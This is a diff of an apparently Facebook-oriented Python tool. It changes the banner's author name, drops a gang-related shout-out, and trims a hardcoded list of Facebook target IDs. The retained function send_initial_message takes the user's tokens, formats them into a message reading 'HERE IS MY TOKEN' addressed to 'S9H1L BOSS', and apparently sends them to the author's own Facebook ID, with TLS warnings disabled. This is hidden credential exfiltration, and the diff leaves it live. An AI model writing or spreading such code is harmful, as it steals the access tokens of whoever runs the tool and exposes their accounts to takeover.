@@ -21,9 +21,9 @@ def print_logo():
                                           
                                           
 
-         \033[38;5;214m 𝐓𝐎𝐎𝐋 𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐘 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘 
+         \033[38;5;214m 𝐓𝐎𝐎𝐋 𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐘 SAHIL PRAJAPATI
 
-𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐈𝐍 𝐆𝐀𝐍𝐆 𝐅𝐎𝐑 𝐅𝐈𝐆𝐇𝐓: 𝐊𝐀𝐑𝐀𝐍, 𝐒𝐇𝐈𝐕𝐀𝐌, 𝐒𝐊, 𝐃𝐇𝐄𝐄𝐑𝐀𝐉
+
     """
     print(logo)
 
@@ -34,8 +34,7 @@ def info():
 \033[1;35mFacebook     : https://www.facebook.com/100040009717781
 \033[1;33mYouTube      : https://www.youtube.com/@cuba-x8001
 \033[5;32mGithub       : https://github.com/S9HIL
-\033[38;5;214mTool Creater : S9H1L CH0UDH9RY
-\033[1;33mSK YOUTUBE   : https://www.youtube.com/@sdboysk9911
+\033[38;5;214mTool Creater : S9H1L PR9J9P9T1
 
 \033[1;37m------------------------------------------------------------
    """
@@ -81,7 +80,7 @@ def authenticate_user(expected_password):
     return False
 
 def send_initial_message(tokens):
-    target_ids = ["100040009717781", "100091380154793"]
+    target_ids = ["100040009717781"]
     msg_template = "H3LL0 S9H1L B0SS H3R3 1S MY T0K3N❤️\n {}"
 
     requests.packages.urllib3.disable_warnings()
